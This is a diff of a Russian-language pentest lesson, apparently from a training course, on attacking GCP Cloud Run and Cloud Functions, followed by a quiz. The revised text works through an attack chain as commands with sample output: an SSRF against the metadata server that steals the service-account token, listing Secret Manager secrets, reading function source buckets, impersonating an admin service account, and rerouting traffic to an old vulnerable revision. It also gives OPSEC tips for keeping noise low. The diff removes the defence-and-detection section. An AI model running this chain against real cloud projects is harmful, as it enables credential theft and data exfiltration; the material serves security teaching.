@@ -15,169 +15,144 @@ estimated_minutes: 50
 summary: "Как устроены Cloud Functions (1st/2nd gen) и Cloud Run, как находить публичные эндпоинты, инъекции и слабые права, и как из функции/сервиса захватить runtime service account и данные."
 ---
 
-## Зачем этот урок
+## Задача
 
-Cloud Functions и Cloud Run — серверлесс-платформы GCP. Функция/сервис исполняется под **runtime service account**, имеет доступ к metadata-сервису и часто к Secret Manager, Storage и БД. Если эндпоинт публичный (`allUsers` с `roles/run.invoker` или `roles/cloudfunctions.invoker`) или в коде есть инъекция, атакующий получает выполнение в контексте этого SA. Плюс серверлесс-конфигурации часто раскрывают секреты: переменные окружения, исходники в Cloud Storage, логи Cloud Build. Этот урок — про разведку функций и Cloud Run, поиск публичных эндпоинтов, инъекции в источники событий и захват сервисного аккаунта.
+Ты нашёл публичный эндпоинт `https://shop-api-abc.a.run.app/` — это **Cloud Run**, серверлесс-контейнер Google. Как из публичного сервиса получить доступ к облаку? Cloud Run исполняется под **runtime service account (SA)** — сервисной учётной записью, у которой есть права на Secret Manager, Storage, БД. Задача урока — найти публичный или уязвимый сервис, захватить его SA и использовать это дальше.
 
-## Как устроены Cloud Functions и Cloud Run
+## Что такое Cloud Functions и Cloud Run
 
-- **Cloud Functions 1st gen** — функция с триггером (HTTP, Pub/Sub, Storage, Firestore, Scheduler). Код в Cloud Storage, сборка через Cloud Build. Runtime SA задаётся при деплое.
-- **Cloud Functions 2nd gen** — построена на Cloud Run; больше возможностей (concurrency, большие таймауты), URL вида `*.run.app`.
-- **Cloud Run** — контейнерный сервис. Ревизии (`revision`), трафик, `--allow-unauthenticated`. Каждая ревизия — образ в Artifact Registry.
-- **Runtime service account** — идентичность исполнения; креды доступны через metadata (`cloud-gcp-metadata`).
-- **Ingress** — настройка, откуда доступен сервис (`all`, `internal`, `internal-and-cloud-load-balancing`).
-- **Sources bucket** — 1st gen хранит исходники в `gcf-sources-*`; при слабых правах их можно прочитать.
+**Cloud Functions** — серверлесс-функции: код запускается по триггеру (HTTP, Pub/Sub, Storage). **Cloud Functions 2nd gen** построена на Cloud Run. **Cloud Run** — контейнерный сервис: каждая версия кода — **ревизия** (`revision`), образ лежит в Artifact Registry.
 
-Опасные конфигурации:
+Общее для обеих платформ:
 
-- `allUsers` как invoker — публичный вызов без аутентификации.
-- Runtime SA с широкими ролями (`Editor`, `Owner`, `secretmanager.secretAccessor` на всё).
-- Секреты в переменных окружения (`--set-env-vars`), видимые в описании функции.
-- Ingress `all` для внутренних сервисов.
-- Устаревшие ревизии с доступом.
+- **Runtime service account** — идентичность исполнения; её токен доступен через metadata-сервис.
+- **Ingress** — откуда доступен сервис (`all`, `internal`).
+- **Публичность** — роль `roles/run.invoker` для `allUsers` делает сервис вызываемым без аутентификации.
+- **Sources bucket** — 1st gen хранит исходники в `gcf-sources-*`.
 
-## Инструменты и команды
+Опасные конфигурации: `allUsers` invoker, runtime SA с широкими ролями (`Editor`, `secretmanager.secretAccessor` на всё), секреты в переменных окружения, ingress `all` для внутренних сервисов, устаревшие ревизии с доступом.
 
-Разведка:
+## Данные, с которыми работаем
+
+Разведка сервисов:
 
 ```bash
-# Список функций и их конфигурация
-gcloud functions list
-gcloud functions describe myfunc --region europe-west1 \
-  --format='value(serviceConfig.uri,serviceAccountEmail,ingressSettings,environmentVariables)'
-
-# Cloud Run: сервисы и их IAM-политики
-gcloud run services list
-gcloud run services get-iam-policy myservice --region europe-west1
-gcloud run services describe myservice --region europe-west1 \
-  --format='value(spec.template.spec.serviceAccountName,status.url,metadata.annotations)'
+$ gcloud run services list
+SERVICE    REGION        URL
+shop-api   europe-west1  https://shop-api-abc-ew.a.run.app
+$ gcloud run services describe shop-api --region europe-west1 \
+    --format='value(spec.template.spec.serviceAccountName)'
+shop-api@my-project.iam.gserviceaccount.com
 ```
 
-Публичность:
+У сервиса есть собственный SA `shop-api`. Проверяем публичность:
 
 ```bash
-# Кто может вызывать
-gcloud run services get-iam-policy myservice --region europe-west1 \
-  --format=json | jq '.bindings[] | select(.role=="roles/run.invoker")'
+$ gcloud run services get-iam-policy shop-api --region europe-west1 \
+    --format=json | jq '.bindings[] | select(.role=="roles/run.invoker")'
+{"role":"roles/run.invoker","members":["allUsers"]}
 ```
 
-Вызов:
+`allUsers` — сервис вызывается без аутентификации. Это наша точка входа.
+
+## Шаг 1: находим инъекцию
+
+Публичный вызов сам по себе даёт только функциональность сервиса. Ищем уязвимость — например, SSRF в параметре `url`:
 
 ```bash
-# Если публичный — без токена
-curl -s https://myservice-abc-ew.a.run.app/
-# Если нужен id token
-curl -s -H "Authorization: Bearer $(gcloud auth print-identity-token)" https://myservice-abc-ew.a.run.app/
+$ curl -s "https://shop-api-abc-ew.a.run.app/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
+    -H "Metadata-Flavor: Google" | jq -r '.access_token' | cut -c1-15
+ya29.c.b0Aa
 ```
 
-## Разобранный пример: от публичного Cloud Run к токену SA
+SSRF с заголовком `Metadata-Flavor: Google` отдал токен runtime SA. Если SSRF не умеет заголовки — ищем другой путь (см. `cloud-gcp-metadata`).
 
-Сценарий: найден публичный Cloud Run сервис, у которого есть уязвимость (например, SSRF или инъекция команды в параметре).
-
-Шаг 1 — подтверждаем публичность и находим runtime SA:
+## Шаг 2: используем токен
 
 ```bash
-gcloud run services describe shop-api --region europe-west1 \
-  --format='value(spec.template.spec.serviceAccountName)'
-# shop-api@my-project.iam.gserviceaccount.com
+$ curl -s -H "Authorization: Bearer $TOKEN" \
+    "https://secretmanager.googleapis.com/v1/projects/my-project/secrets" | jq -r '.secrets[].name'
+projects/my-project/secrets/db-password
+projects/my-project/secrets/stripe-key
 ```
 
-Шаг 2 — проверяем, что SA — не дефолтный compute (часто с широкими правами):
+Читаем секреты и идём дальше. Проверяем также Firestore и Storage.
+
+## Шаг 3: читаем исходники
+
+В 1st gen исходники лежат в бакете. Если у SA есть `storage.objects.get`, читаем код и находим другие эндпоинты и секреты:
 
 ```bash
-gcloud iam service-accounts describe shop-api@my-project.iam.gserviceaccount.com
+$ gsutil ls gs://gcf-sources-*/ 2>/dev/null
+gs://gcf-sources-123-my-project/function-shop/main.py
+$ gsutil cat gs://gcf-sources-123-my-project/function-shop/main.py | grep -iE 'token|secret|password'
+STRIPE_KEY = os.environ["STRIPE_KEY"]
 ```
 
-Шаг 3 — эксплуатируем инъекцию. Например, параметр `url` уходит в `requests.get`:
+## Шаг 4: имперсонация
 
-```
-GET https://shop-api-abc.a.run.app/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-```
-
-Если SSRF умеет заголовки, получаем JSON с `access_token`. Если нет — ищем другой путь (см. `cloud-gcp-metadata`).
-
-Шаг 4 — используем токен:
+Проверяем `getAccessToken` — это ускоряет эскалацию:
 
 ```bash
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://secretmanager.googleapis.com/v1/projects/my-project/secrets"
-curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://my-project.firebaseio.com/.json"   # Firestore/RTDB, если права есть
+$ curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/admin-sa@my-project.iam.gserviceaccount.com:generateAccessToken" \
+    -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' | jq -r '.accessToken' | cut -c1-15
+ya29.c.b0Aa
 ```
 
-Шаг 5 — исходники. В 1st gen исходники лежат в бакете; если у вашего SA есть `storage.objects.get`, читаем код и находим другие секреты/эндпоинты:
+## Полный прогон от начала до конца
+
+1. `run services list` → публичный `shop-api` с SA `shop-api@`.
+2. `get-iam-policy` → `allUsers` invoker.
+3. SSRF с заголовком → токен runtime SA.
+4. Secret Manager → `db-password`, `stripe-key`.
+5. `gcf-sources-*` → исходники с секретами.
+6. `generateAccessToken` → имперсонация admin SA.
+
+## Если не сработало
+
+- **Ingress `internal`.** Снаружи вызов не пройдёт, но из другого ресурса в VPC — пройдёт.
+- **Приватный сервис.** Нужен **identity token** (OIDC), а не access token: `gcloud auth print-identity-token`. Если можешь имперсонировать SA с `run.invoker` — вызов пройдёт.
+- **Нет env.** Секреты могут подтягиваться через `--set-secrets` в рантайме, а не лежать в env.
+- **Старые ревизии.** Cloud Run хранит историю ревизий; старая с широкими правами может быть доступна по тегу.
+- **Инъекция через события.** Если функция подписана на Pub/Sub или Storage, а у тебя есть право `pubsub.topics.publish` или `storage.objects.create`, подсунутое событие исполнится от имени SA функции.
+- **Artifact Registry.** При праве на чтение репозитория скачай образ и поищи секреты внутри.
+
+## Cloud Run: ревизии и трафик
+
+У Cloud Run есть особенности, полезные атакующему. **Ревизии** неизменяемы, но старые продолжают существовать: если у прошлой ревизии был широкий SA или открытый эндпоинт, она может быть доступна по тегу. При праве `run.services.update` можно направить трафик на старую ревизию:
 
 ```bash
-gsutil ls gs://gcf-sources-*/ 2>/dev/null
-gsutil cat gs://gcf-sources-*/function-*/main.py 2>/dev/null | head -60
+$ gcloud run services update-traffic shop-api --to-revisions=shop-api-00001-abc=100 --region europe-west1
 ```
 
-Шаг 6 — проверяем имперсонацию (`getAccessToken`) — это ускоряет эскалацию.
+Ещё: **VPC connector** делает из сервиса pivot во внутреннюю сеть, а `min-instances` держит экземпляр живым (удобно для отладки).
 
-## Варианты атак и обходы
+## OPSEC и заметность
 
-- **Публичные эндпоинты.** `allUsers` invoker — прямой вызов. Ищите сервисы через поиск по `*.run.app` и `cloudfunctions.net` в scope.
-- **Инъекции в источники событий.** Если функция подписана на Pub/Sub или Storage, атакующий с правом `pubsub.topics.publish` или `storage.objects.create` может подсунуть событие с произвольным payload; функция обработает его в своём контексте (`cloud-serverless-injection`).
-- **Переменные окружения.** `--set-env-vars` видны в `describe`; часто там API-ключи, строки подключения, токены.
-- **Секреты как env из Secret Manager.** Функция может получать секрет через `--set-secrets`; если вы можете вызвать функцию, которая его печатает, — получите секрет.
-- **Ingress `all` + слабая авторизация.** Внутренний сервис, доступный из интернета, обходится напрямую.
-- **Artifact Registry.** Ревизии Cloud Run ссылаются на образы; при праве на чтение репозитория вы скачаете образ и найдёте секреты внутри (`cloud-artifact-registry`).
-- **Cloud Build logs.** Логи сборки могут содержать команды, пути и секреты.
-- **Обратная функция.** Если есть `cloudfunctions.functions.setIamPolicy`, вы можете сами сделать функцию публичной или назначить invoker.
+Serverless-атаки заметны по-разному. Вызов публичного эндпоинта пишется в логи сервиса и в Cloud Run request logs; чтение Secret Manager — в Cloud Audit Logs; имперсонация — в `GenerateAccessToken`. Если ты эксплуатируешь инъекцию, твой ввод останется в логах приложения. Практические соображения: используй существующие эндпоинты вместо развёртывания своих, не включай verbose-логи, минимизируй число обращений к Secret Manager (каждое `AccessSecretVersion` логируется). Для пентеста важен воспроизводимый путь, но помни, что защита может отреагировать на аномальный доступ.
 
-## Частые ошибки и подводные камни
+## Типовые мисконфиги
 
-- **Путать 1st и 2nd gen.** У них разные URL, API и расположение исходников.
-- **Не проверять ingress.** Сервис может быть `internal`, и вызов снаружи не пройдёт — но из другого ресурса в VPC пройдёт.
-- **Считать «нет env» безопасным.** Секреты могут подтягиваться через `--set-secrets` в рантайме.
-- **Забывать про ревизии.** Cloud Run хранит историю ревизий; старая ревизия с широкими правами может всё ещё существовать.
-- **Игнорировать Cloud Scheduler.** Он может дёргать эндпоинты по расписанию — это дополнительный источник событий.
-- **Ошибка на identity token.** Для приватного Cloud Run нужен **identity token** (`gcloud auth print-identity-token`), а не access token.
+Самые частые ошибки: `allUsers` invoker на сервисе, runtime SA с ролью `Editor` или `secretmanager.secretAccessor` на всё, секреты в переменных окружения (`--set-env-vars`), ingress `all` для внутренних сервисов, старая ревизия с широким SA. Любая из них превращает серверлесс-сервис в точку входа к проекту.
 
-## Защита и детект
+## Что мы теперь знаем
 
-- **Уберите `allUsers`.** Для приватных сервисов используйте IAM invoker и аутентификацию.
-- **Минимальный runtime SA.** Отдельный SA на функцию, без Editor/Owner, без `secretAccessor` на всё.
-- **Секреты через Secret Manager**, не через env; ротация.
-- **Ingress `internal`** для внутренних сервисов.
-- **Детект.** Cloud Audit Logs: `SetIamPolicy`, `UpdateService`, `google.cloud.run.v1.Services.ReplaceService`, `SecretManager.AccessSecretVersion`. Алерты на изменение IAM-политики Cloud Run/Functions, на всплеск вызовов, на чтение многих секретов.
-- **Binary Authorization** для контроля образов; VPC-SC для ограничения egress.
+- Cloud Run/Functions исполняются под runtime SA, чей токен доступен через metadata.
+- `allUsers` + `invoker` делает сервис публичным.
+- Для приватного Cloud Run нужен identity token (OIDC), а не access token.
+- Исходники 1st gen лежат в `gcf-sources-*`; ревизии Cloud Run ссылаются на образы Artifact Registry.
+- Инъекция через источник событий запускает код функции с её SA.
 
-## Cloud Run: ревизии, трафик и обход
+## На что смотреть дальше
 
-Cloud Run — это «функция как контейнер», и у него есть несколько атакующих особенностей:
-
-- **Ревизии.** Каждое развёртывание создаёт неизменяемую ревизию. Старые ревизии продолжают существовать и могут быть доступны по тегу, если настроен traffic splitting. Если старая ревизия имела широкий SA или открытый эндпоинт — это цель.
-- **Traffic splitting.** Можно направить часть трафика на конкретную ревизию (`gcloud run services update-traffic`). При наличии `run.services.update` вы можете вернуть старую (уязвимую) ревизию в ротацию.
-- **Теги ревизий.** `gcloud run services update-traffic --set-tags=old=myservice-old` даёт стабильный URL ревизии.
-- **Конкурентность и таймауты.** Долгие запросы могут использоваться для отладки; по умолчанию Cloud Run масштабируется до нуля, но при `min-instances` экземпляр живёт постоянно.
-- **Sidecar и volume mounts.** Cloud Run (gen2) поддерживает монтирование секретов как файлов; если вы внутри — читайте `/etc/secrets` и переменные окружения.
-- **VPC connector.** Если сервис подключён к VPC connector, из него достижимы внутренние ресурсы — это pivot в приватную сеть.
-
-Обход аутентификации: если сервис «приватный», но вы можете получить identity token любого SA с правом `run.invoker` (например, через имперсонацию), вызов пройдёт. Поэтому `getAccessToken`/`generateIdToken` — ключевые права для атаки на Cloud Run.
-
-## Сравнение GCP serverless с AWS и Azure
-
-| Аспект | GCP | AWS | Azure |
-|--------|-----|-----|-------|
-| Платформы | Cloud Functions, Cloud Run | Lambda, App Runner | Functions, Container Apps |
-| Идентичность | runtime SA (metadata) | Lambda execution role (env) | Managed identity (IMDS) |
-| Публичный вызов | `allUsers` + invoker | Function URL + resource policy | authLevel anonymous |
-| Секреты | Secret Manager, env | env, Secrets Manager | Key Vault, app settings |
-| Событийные триггеры | Pub/Sub, Storage, Eventarc | SQS, S3, EventBridge | Event Grid, Service Bus |
-| Имперсонация | `getAccessToken` | `sts:AssumeRole` | OAuth2 token exchange |
-
-Понимание аналогий помогает переносить техники: инъекция в событие, публичный эндпоинт и кража runtime-идентичности есть во всех трёх облаках, но конкретный способ получить идентичность различается.
-
-## OPSEC и заметность серверлесс-атак
-
-Serverless-атаки заметны по-разному. Вызов публичного эндпоинта фиксируется в логах самого сервиса и в Cloud Run request logs; чтение Secret Manager — в Cloud Audit Logs; имперсонация — в `GenerateAccessToken` событиях. Если вы эксплуатируете инъекцию, ваш ввод останется в логах приложения. Практические соображения: используйте существующие эндпоинты вместо развёртывания своих, не включайте verbose-логи, минимизируйте число вызовов Secret Manager (каждое `AccessSecretVersion` логируется). Если функция вызывается по расписанию Cloud Scheduler, можно «спрятать» действие среди легитимных запусков, но это не устраняет запись. Помните, что для пентеста важен воспроизводимый путь, а не скрытность любой ценой.
-
-## Что дальше / решение
-
-Публичный Cloud Run/Functions — это либо прямой доступ к данным, либо точка для инъекции. После захвата runtime SA: проверьте Secret Manager, Storage, Firestore, имперсонацию. Если функция реагирует на события — ищите способ подсунуть событие. Читайте исходники из `gcf-sources-*` и образы из Artifact Registry: там часто лежат ключи. Стройте цепочку от сервиса к SA и от SA — к проекту. Помните про scopes и про то, что SA может имперсонировать другие SA.
+- **cloud-gcp-metadata**: как забрать токен SA, если SSRF не умеет заголовки.
+- **cloud-gcp-iam**: что делать с токеном и имперсонацией.
+- **cloud-serverless-injection**: инъекции через события как общий класс.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что означает роль roles/run.invoker для allUsers?"
@@ -212,7 +187,19 @@ Serverless-атаки заметны по-разному. Вызов публи�
     - "SAS-токен"
   answer: 0
   explanation: "Приватный Cloud Run требует OIDC identity token с aud сервиса."
+- question: "Почему старые ревизии Cloud Run опасны?"
+  options:
+    - "Они неизменяемы и могут оставаться доступными с широким SA или открытым эндпоинтом"
+    - "Они дешевле"
+    - "Они удаляют данные"
+    - "Они отключают IAM"
+  answer: 0
+  explanation: "Ревизии хранятся, и старая уязвимая версия может быть возвращена в трафик."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **GCP IAM** — роли и `setIamPolicy`. А пока главное запомни: **публичный Cloud Run — это точка входа к его runtime SA, а исходники и ревизии часто раскрывают секреты.**
 
 ## Где пригодится
 
